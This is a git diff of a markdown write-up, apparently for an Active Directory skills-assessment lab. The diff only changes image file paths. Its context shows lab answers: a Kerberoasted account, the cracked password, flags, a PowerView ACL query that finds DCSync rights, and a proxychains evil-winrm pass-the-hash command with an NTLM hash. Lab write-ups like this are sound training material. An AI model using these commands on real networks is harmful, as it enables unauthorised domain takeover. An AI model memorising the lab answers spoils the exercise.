@@ -14,13 +14,13 @@ Apply what you learned in this module to compromise the domain and answer the qu
 
 **Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer**
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (2).png" alt=""><figcaption><p>svc_sql</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption><p>svc_sql</p></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
 
 **Crack the account's password. Submit the cleartext value.**
 
-<figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption><p>lucky7</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption><p>lucky7</p></figcaption></figure>
 
 **Submit the contents of the flag.txt file on the Administrator desktop on MS01**
 
@@ -30,7 +30,7 @@ we have to know what IP does MS01 has&#x20;
 Resolve-IPAddress -ComputerName MS01
 ```
 
-<figure><img src="../../../.gitbook/assets/image (20) (3).png" alt=""><figcaption><p>172.16.6.50</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (3) (1).png" alt=""><figcaption><p>172.16.6.50</p></figcaption></figure>
 
 When SMB scan was performed, there were ADMIN$ and C$ shares, which were read and writable.
 
@@ -165,9 +165,9 @@ $sid = Convert-NameToSid tpetty
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption><p>DS-Replication-Get-Changes-All</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38) (1) (1).png" alt=""><figcaption><p>DS-Replication-Get-Changes-All</p></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption><p>DS-Replication-Get-Changes-In-Filtered-Set</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1) (2).png" alt=""><figcaption><p>DS-Replication-Get-Changes-In-Filtered-Set</p></figcaption></figure>
 
 
 
@@ -195,4 +195,4 @@ xfreerdp didn't work but evil-winrm did
 proxychains evil-winrm -i 172.16.6.3 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
 ```
 
-<figure><img src="../../../.gitbook/assets/image (27) (2).png" alt=""><figcaption><p>r3plicat1on_m@st3r!</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption><p>r3plicat1on_m@st3r!</p></figcaption></figure>
